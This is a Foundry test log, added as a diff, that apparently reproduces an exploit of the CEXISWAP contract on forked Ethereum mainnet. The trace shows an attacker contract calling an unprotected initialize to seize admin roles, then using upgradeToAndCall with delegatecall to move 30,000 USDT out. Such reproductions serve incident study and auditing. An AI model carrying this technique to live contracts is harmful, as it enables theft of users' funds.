@@ -1,0 +1,69 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/CEXISWAP_exp.sol:CexiTest
+[PASS] testExploit() (gas: 565125)
+Logs:
+  Attacker USDT balance after exploit: 30000.000000
+
+Traces:
+  [5083] CexiTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 18182605 [1.818e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(CEXISWAP: [0xB8a5890D53dF78dEE6182A6C0968696e827E3305], "CEXISWAP")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7], "USDT")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [609725] CexiTest::testExploit()
+    ├─ [316800] → new Exploiter@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 1582 bytes of code
+    ├─ [249966] Exploiter::exploit()
+    │   ├─ [126378] CEXISWAP::initialize("HAX", "HAX", Exploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Exploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Exploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Exploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   ├─ emit RoleAdminChanged(role: 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775, previousAdminRole: 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775, newAdminRole: 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775)
+    │   │   ├─ emit RoleAdminChanged(role: 0x5d8e12c39142ff96d79d04d15d1ba1269e4fe57bb9d26f43523628b34ba108ec, previousAdminRole: 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775, newAdminRole: 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775)
+    │   │   ├─ emit RoleAdminChanged(role: 0x88aa719609f728b0c5e7fb8dd3608d5c25d497efbb3b9dd64e9251ebba101508, previousAdminRole: 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775, newAdminRole: 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775)
+    │   │   ├─ emit RoleGranted(role: 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775, account: Exploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], sender: Exploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   ├─ emit RoleGranted(role: 0x5d8e12c39142ff96d79d04d15d1ba1269e4fe57bb9d26f43523628b34ba108ec, account: Exploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], sender: Exploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   ├─ emit RoleGranted(role: 0x88aa719609f728b0c5e7fb8dd3608d5c25d497efbb3b9dd64e9251ebba101508, account: Exploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], sender: Exploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   ├─  storage changes:
+    │   │   │   @ 255: 0x000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   @ 253: 0xc0fe10c6a6327ea46fb8e0a0b683f9c70e9c98fc6bef04c1df346dc4fea41962 → 0xffadb51f58a70026fb35f0b0ca1db13db0b897ee30be4bc32261391621772f3d
+    │   │   │   @ 251: 0x4345584953574150000000000000000000000000000000000000000000000010 → 0x4841580000000000000000000000000000000000000000000000000000000006
+    │   │   │   @ 0x37cf59f2fde2d3a76e2d328114e650189ff64d2a843befce1671771fa8551400: 0 → 1
+    │   │   │   @ 254: 0x0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   @ 0x2d1166143d31f9649a4b0137b4d7c23ffb09e9cea7dba02652007869cc584562: 0 → 1
+    │   │   │   @ 256: 0x00000000000000000000000019d6d5aebeae778586f73786108b04e9910b1ccd → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   @ 0xdf1f75e73223a4cdc34bdf56e87b61e09199c89ec8569d2b1b6cbcdc33cba81e: 0 → 1
+    │   │   │   @ 252: 0x7631000000000000000000000000000000000000000000000000000000000004 → 0x4841580000000000000000000000000000000000000000000000000000000006
+    │   │   └─ ← [Stop]
+    │   ├─ [118423] CEXISWAP::upgradeToAndCall(Exploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x1de24bbf)
+    │   │   ├─ [46578] Exploiter::exploit2() [delegatecall]
+    │   │   │   ├─ [5031] USDT::balanceOf(CEXISWAP: [0xB8a5890D53dF78dEE6182A6C0968696e827E3305]) [staticcall]
+    │   │   │   │   └─ ← [Return] 30000000000 [3e10]
+    │   │   │   ├─ [37601] USDT::transfer(CexiTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30000000000 [3e10])
+    │   │   │   │   ├─ emit Transfer(from: CEXISWAP: [0xB8a5890D53dF78dEE6182A6C0968696e827E3305], to: CexiTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 30000000000 [3e10])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xd02045aee84d0cfa1e31be124bbed0896f9851f3df97823db8afe324549216b3: 0x00000000000000000000000000000000000000000000000000000006fc23ac00 → 0
+    │   │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0 → 0x00000000000000000000000000000000000000000000000000000006fc23ac00
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [572] Exploiter::upgradeTo(0x0000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit Upgraded(implementation: Exploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [1031] USDT::balanceOf(CexiTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 30000000000 [3e10]
+    ├─ emit log_named_decimal_uint(key: "Attacker USDT balance after exploit", val: 30000000000 [3e10], decimals: 6)
+    ├─  storage changes:
+    │   @ 31: 1 → 0x00000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f01
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.15s (5.80s CPU time)
+
+Ran 1 test suite in 8.37s (7.15s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
